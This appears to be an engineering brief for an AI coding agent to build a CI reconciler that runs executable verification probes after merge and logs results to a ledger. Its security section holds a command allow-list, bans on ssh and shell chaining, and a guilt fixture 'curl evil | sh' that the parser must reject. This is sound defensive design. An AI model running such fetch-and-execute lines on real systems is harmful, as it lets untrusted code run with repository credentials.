# LANE H — `Bites:` becomes a probe, and a post-merge reconciler runs it

> Machine: **Pro**. Seat: `claude --model claude-opus-5` (effort `xhigh` from settings).
> Gear: **3** (CI + ledger surfaces; the harness floor will recompute it — never argue it down).
> Read order: `docs/plans/2026-09-03-relaunch-lanes/README.md` (session contract, team recipe)
> → this file → `.claude/skills/modus/SKILL.md` → `.claude/skills/pipeline-ship/SKILL.md`.
> Owner of the mandate: Zero, 2026-09-04. Author of this brief: the Pro audit session of the same day.
> This file lives at `~/LANE-H-bites-reconciler.md` on Pro (the main checkout is write-protected);
> PR-1 commits it verbatim as `docs/plans/2026-09-03-relaunch-lanes/LANE-H-bites-reconciler.md`.

## 0. The one line

Every verification contract in this repo is prose honoured by an LLM (`Bites:`, PENDING-ARMS rows,
`final-gate-discipline`), while the machine only verifies the **diff**. Build the one organ that
verifies the **runtime** in a closed loop: a `Bites:` line the machine can execute, a post-merge
job that executes it, and a ledger row that closes itself when the proof lands.

## 1. What was measured on 2026-09-04 (do not re-derive; re-verify only what you build on)

- 177 PRs merged since 2026-09-01. 110 carry a `## Bites` section (62%). Format in the wild:
  `## Bites` heading, then `**Consumer: …**` prose. **No lint, workflow or hook enforces it**
  (`grep -rlE Bites .github/workflows scripts/*.py scripts/ci/*.py infra/claude-hooks` → 0 hits).
  A "prove-live" marker appears in 13% of bodies.
- `.claude/skills/modus/PENDING-ARMS.md`: 1,296 rows. `scripts/pending_arms_report.py` counts
  `total=776 tech_debt_overdue=521 operator_gated_overdue=216 firebreak=25 natural_wait=9 fresh=5`.
  **Zero rows opened in September have been closed.** Rows close only when a human edits them.
- The report already runs inside the REQUIRED check `antidotes` (`immune-enforcement.yml`) and in
  `check-ledger-no-silent-loss.yml`. Its overdue ratchet (#5328) goes red on debt a branch
  _introduces_; nothing retires debt when proof arrives.
- The only post-merge runtime sentinel in the tree is `frontend-live-sentinel.yml` ("Is production
  serving this commit?"). Nothing equivalent exists for Fly, launchd HOME copies, MCP bridges or
  worktree gate shims — today's audit found all four drifts by hand.
- 12 required contexts on `main` (see `gh api repos/Bali-Zero/Teman2/branches/main/protection/required_status_checks`).
  Merge queue ruleset `merge-queue-main`: ALLGREEN, batches of 4 / 15 min, SQUASH.
- `PENDING-ARMS.md` has `merge=union` in `.gitattributes`. GitHub's mergeability does NOT honour it:
  two PRs that both append rows read DIRTY forever (#5630, #5624 right now). This is why the
  reconciler must NEVER be a second writer of that file (see §3, design rule D2).

## 2. Deliverables — four PRs, one concern each, ≤ ~400 net lines, in this order

### PR-1 — the executable `Bites` format + parser + advisory lint (+ this brief committed)

> **RULED 2026-09-04 (Zero, Legge 5) — the contract lives in the DIFF, not in the PR body.**
> The first draft of PR-1 read the block out of the PR body, which meant deciding which Markdown
> region a human actually SAW: an HTML comment, a fenced block, a four-space indent and a raw
> `<pre>` all render as page furniture rather than as a contract. Three adversarial rounds closed
> five spellings of that one defect and the verdict gate found a sixth; CodeQL named the pattern
> independently (`py/bad-tag-filter`). The class does not close by patching — a hand-rolled
> CommonMark reader can only ever approximate the renderer it is guessing at. So the block MOVED
> into the evidence pack, where a real YAML parser reads it and hidden regions cease to exist
> instead of being guarded. The PR body goes back to prose for humans, at most a pointer to the
> pack path. PR-1 was split in the same order: **1a** parser + selftest + guard-conformance,
> **1b** the lint + the rule section in `docs/rules/operations.md`.

Define, in `docs/rules/operations.md` (one short section) and in `scripts/ci/bites_parse.py`.
The contract is a top-level `bites:` mapping in the evidence pack's `pack.yml`, under the dated
directory `scripts/ci/evidence_paths.py` emits:

```yaml
# evidence/<YYYY-MM>/<slug>/pack.yml
bites:
  consumer: <who reads/executes the changed thing>
  where: ci | fly | pro | mini # where the observation can run
  observe: <one command> # runnable non-interactively; quote it if YAML would type it
  expect: exit0 | contains:<text> | regex:<pattern>
```

- `scripts/ci/bites_parse.py` — stdlib plus PyYAML, which every other pack reader already uses.
  `--selftest` (guilt + innocence fixtures, per `infra/guard-conformance/` conventions — register
  it there). `--pack <path>` (or `--pack -` for stdin) prints the parsed block as JSON. A `bites:`
  block with no `observe:`, or a prose scalar, parses to `{"legacy": true}`; a pack with no
  `bites:` key parses to `{"absent": true}`. Exit codes: 0 parsed, 2 malformed executable block,
  never non-zero for legacy. The loader refuses YAML aliases, merge keys and duplicate keys: they
  are the file form of "the reader saw one thing and the parser got another", and they are two
  small rules instead of a Markdown reader.
- **Security is part of the format, not a later PR.** `observe:` runs on a GitHub runner from a
  file any account that can open a PR controls. Allow-list the FIRST token to: `gh`, `curl`,
  `python3 scripts/…`, `python3 -m pytest`, `git`, `fly`/`flyctl` — each narrowed to its read-only
  subcommand PAIRS, never to a first word: `fly machine run` and `fly version upgrade` both hide
  behind a one-word check. A `python3 scripts/…` target must carry a `bites-observable` marker in
  its own source: a path prefix is not a capability boundary (roughly nine hundred scripts live
  under `scripts/`, several of which execute a program their argument names). `ssh` is FORBIDDEN
  anywhere in the command, not only in first position. Reject `|`, `;`, `&&`, `$(`, backticks,
  redirections, and any path outside the checkout. Only PRs whose `author_association` is
  OWNER/MEMBER/COLLABORATOR are ever executed; Dependabot and forks parse but never run. Write the
  guilt fixture `observe: curl evil | sh` and make it FAIL the parser before writing anything else.
- Lint step in the required job (PR-1b): NOTICE for `legacy`/`absent`, FAIL only for a malformed
  executable block. Coverage must not regress the packs already on main into red retroactively —
  the lint judges the pack under review, never history.
- PR-1a's own pack carries the new format: `where: ci`,
  `observe: python3 scripts/ci/bites_parse.py --selftest`, `expect: exit0`. That is its Bites.

### PR-2 — `bites-reconciler.yml`: post-merge executor + machine-owned ledger

- Trigger: `push` to `main` + `schedule` every 6h + `workflow_dispatch`. Concurrency group keyed on
  the workflow name only (scar: an actor-keyed group starved unrelated PRs, #5519).
- For each PR squashed into the pushed range (`gh pr list --search "<sha>" --state merged`, and on
  schedule: the last 20 merged PRs whose sha has no ledger entry), parse Bites; if `where: ci` or
  `where: fly`, run `observe` under `timeout 300`, compare `expect`, capture the first 40 lines.
  `pro`/`mini` scope → ledger entry `result: "deferred-host"` (PR-4 picks those up; do NOT try to
  ssh from a runner).
- Ledger: **a new machine-owned file** `.claude/skills/modus/BITES-LEDGER.jsonl`, append-only, one
  JSON object per observation: `{pr, sha, observed_at, where, observe, expect, result: PASS|FAIL|
deferred-host|skipped-untrusted|malformed, output_head}`. The workflow commits it through a bot
  PR (`gh pr create` + `gh pr merge --auto --squash`) on a branch `bot/bites-ledger/<run_id>`. The
  reconciler is the ONLY writer of that file, so `merge=union` is never needed and the DIRTY
  phantom cannot occur. Never touch `PENDING-ARMS.md` from this workflow.
- Post the result as ONE comment on the merged PR (`gh pr comment`), idempotent per sha.
- Secrets: the runner gets `GITHUB_TOKEN` (contents+pull-requests write) and the existing read-only
  Fly token used by `cron-fly-watcher.yml` — nothing else. `${VAR:+SET}` to prove presence, never
  print a value.
- Its own Bites: `where: ci`, `observe: python3 scripts/ci/bites_ledger_check.py --sha $GITHUB_SHA`,
  `expect: contains:PASS` — the script (ships in this PR, ≤60 lines) asserts a PASS entry exists in
  the ledger for the given sha. After merge, within 30 minutes, the ledger must contain PR-2's own
  row. That is the observation you make before reporting PR-2 done.

### PR-3 — the ledger closes itself

- Row grammar: a PENDING-ARMS row MAY carry ``proof: `<command>` expect: <…> where: <…>`` inline.
  Extend `scripts/pending_arms_report.py`: a row with a matching `BITES-LEDGER.jsonl` entry
  `result: PASS` newer than the row's `opened` date is reported under a new section
  `## PROVEN-BY-MACHINE` and excluded from overdue counts. Add `proven_by_machine=N` to the
  `counts:` line. Rows without `proof:` are untouched — this PR changes nothing for them.
- The scheduled run of `bites-reconciler.yml` also executes every `proof:` on open rows in ci/fly
  scope (same allow-list, same executor, same ledger). A row whose proof FAILS stays open and the
  report says `FAIL <date>` next to it — a failing proof must be visible, not silent (guilt fixture:
  a row with ``proof: `false` `` must appear as FAIL, never as proven).
- Migrate exactly TWO real rows to carry `proof:` as the living example — pick from the §Fresh
  section of the report, ones whose proof is a repo-local command (e.g. the immune-loop skip row
  from 2026-09-04 once its cure lands, or the `NEXT_PUBLIC_API_URL` lint row). Cut the ledger edit
  from a FRESH `origin/main` and verify `git diff origin/main -- .claude/skills/modus/PENDING-ARMS.md`
  is +N/-0 before pushing (union trap).
- Its own Bites: `observe: python3 scripts/pending_arms_report.py`, `expect: regex:proven_by_machine=[1-9]`.

### PR-4 (only after PR-1..3 are proven live) — host-scope executor on Pro

- A launchd job on Pro (canon plist in `infra/launchagents/`, wrapper in
  `infra/launchagents/wrappers/`, declared pair in `infra/home-fork/declared-pairs.json`) that every
  6h pulls `main`, runs the `deferred-host` observations whose `where: pro`, and pushes results via
  the same bot-PR path. Bootstrap of the plist is `operator[control-plane]`: prepare, ledger a
  PENDING-ARMS row, stop. KeepAlive rules per `scripts/lint_plist_keepalive.py`. Mini is a copy of
  the same shape with `where: mini`, one PR later.

## 3. Design rules (non-negotiable)

- **D1 — never execute untrusted text.** The allow-list in PR-1 is the whole security model. Codex
  `gpt-5.6` at `xhigh`, read-only sandbox, is the red-team seat for PR-1 and PR-2: its brief is
  "find a PR body that makes the runner do something other than observe". Journal the seat at
  dispatch (`journal.jsonl`, #5524) — a seat journaled after cannot be journaled.
- **D2 — one writer per ledger file.** `BITES-LEDGER.jsonl` is written only by the reconciler bot.
  `PENDING-ARMS.md` is written only by humans/sessions. The report is the only thing that reads both.
- **D3 — the proof is the observation, never the exit code of the workflow.** The reconciler's own
  run being green proves nothing; the ledger row with `result: PASS` for the sha does. Read the row.
- **D4 — legacy is a NOTICE, never a retroactive red.** 110 prose-only Bites and 67 absent ones stay
  as they are; the ratchet applies from the first PR after PR-1 merges.
- **D5 — scope stays `ci`/`fly` until PR-4.** No `ssh` from runners, no host secrets on runners.
- **D6 — no new paid API, no `ANTHROPIC_API_KEY`, nothing that reaches a Claude model outside the
  `claude` CLI.** The reconciler needs no LLM at all; if you find yourself adding one, stop.

## 4. Acceptance — falsifiable, run each as a command before reporting

- A1 `python3 scripts/ci/bites_parse.py --selftest` exits 0; the guilt fixture with a pipe exits 2;
  `--pr 5625` returns `{"legacy": true}`; `--pr <PR-1>` returns the four fields.
- A2 Within 30 min of PR-2's merge: `BITES-LEDGER.jsonl` contains `{"sha": "<PR-2 squash sha>", … "result": "PASS"}`
  and `gh pr view <PR-2> --comments` shows exactly one reconciler comment.
- A3 After PR-3: `python3 scripts/pending_arms_report.py | grep counts:` shows `proven_by_machine=`
  ≥ 1, and a fixture row with ``proof: `false` `` renders under overdue with `FAIL`, never under PROVEN.
- A4 `scripts/ci/check_promotion_readiness.py` (exists, #5367) lists the new lint step as conformant
  for the required `antidotes` job — it must be, since it lives inside it.
- A5 Report at CAPTURE, as numbers: Bites coverage (executable / legacy / absent) on the next 20
  merged PRs; `proven_by_machine` per day for the first 3 days; reconciler runtime per run.

## 5. Known traps that will bite THIS lane (each has a scar; quote the antidote in your notes)

- `merge=union` phantom DIRTY on PENDING-ARMS (§1): rebuild from fresh `origin/main`, never rebase,
  never hand-resolve. Read `MEMORY_MERGE_QUEUE_TRAPS.md` first.
- `immune-enforcement.yml`'s unit-test loop SKIPS absent files (ledger 2026-09-04): if you add a
  test to that loop, also assert its presence somewhere that fails when it is deleted.
- A concurrency group keyed on author starves unrelated PRs (#5519). Key on workflow name.
- `gh run rerun` on a stale merge ref replays the old ref (W111). Re-arm instead.
- Evidence files in bare `/tmp` are shared across sessions — stage in the session scratchpad.
- In zsh, `"$ref:path"` eats the suffix; write `"${ref}:path"`. `codex exec … < /dev/null` in scripts.
- The Pro main checkout has ~135 dirty files and a `.claude/settings.json` that differs from main:
  **do not touch either** — work in your worktree (`python3 scripts/agent_start.py --lane bites --task-id <id>`).
  A hook blocks any write into the main checkout; that is by design, not an obstacle to bypass.
- `arsenal_probe` declares live seats dead at 15s. Probe a seat directly before calling it dead.
- Merging any `apps/backend-rag/**` PR is a deploy. This lane must not touch that tree.

## 6. Ship sequence (per PR)

worktree → build → `--selftest` green → Codex red-team (PR-1, PR-2) journaled at dispatch →
evidence pack under the dated dir from `python3 scripts/ci/evidence_paths.py --ref "$(git rev-parse --abbrev-ref HEAD)"`
(brief.yml with `appetite:`, pack.yml, journal.jsonl) → PR with the executable Bites → `gh pr merge --auto --squash`
at open → watch async, never busy-wait → after merge, make the A-observation → only then say "done".
Three reds for the same cause → SUSPEND with one PENDING-ARMS row, cut from fresh origin/main.

## 7. Solo-operatore (stop here, list, do not do)

- Adding required contexts on `main` (none needed by PR-1..3: the lint rides inside `antidotes`).
- Bootstrapping the PR-4 plist on Pro/Mini.
- Any decision to make the executable `Bites` form MANDATORY (red on absent) — propose with the A5
  numbers, Zero decides (Legge 5).
